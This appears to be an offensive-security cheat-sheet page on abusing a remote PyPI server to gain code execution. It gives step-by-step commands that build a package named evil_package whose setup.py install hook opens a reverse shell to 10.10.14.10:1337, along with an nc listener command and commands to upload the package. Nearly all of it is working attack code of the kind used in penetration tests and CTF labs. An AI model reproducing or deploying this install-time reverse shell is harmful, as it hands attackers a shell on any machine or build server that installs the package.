---
title: "Pypi"
date: 2024-7-19
tags: ["python", "pypi", "package", "rce"]
---

---
### Abuse #1: Remote Pypi Server

#### 1. Create files

```bash
mkdir evil_package
```

```bash
mkdir evil_package/evil_package
```

```bash
cd evil_package
```

```bash
touch README.md
```

```bash
touch evil_package/__init__.py
```

```bash
touch setup.cfg
```

```bash
touch setup.py
```

#### 2. Replace setup.py

```python
#!/usr/bin/env python3

from setuptools.command.install import install
from setuptools import setup
import os
import socket
import subprocess

class Exploit(install):
    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.14.10",1337)) # CHANGE HERE
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p = subprocess.call(["/bin/sh", "-i"])

setup(name="evil_package",
      version="1.0.0",
      description="Evil Package",
      author="user",
      author_email="user@example.com",
      url="http://example.com",
      license="MIT",
      zip_safe=False,
      cmdclass={"install": Exploit})
```

#### 3. Create ~/.pypirc

```bash
[distutils]
index-servers =
  example
[example]
repository: http://pypi.example.com
username: user
password: password
```

#### 4. Exploit

```bash
# Open a nc listener
rlwrap nc -lvnp 1337
```

<br>

```bash
# Create an archive
python3 setup.py sdist
```

```bash
# Upload
python3 setup.py sdist upload -r example
```

<br>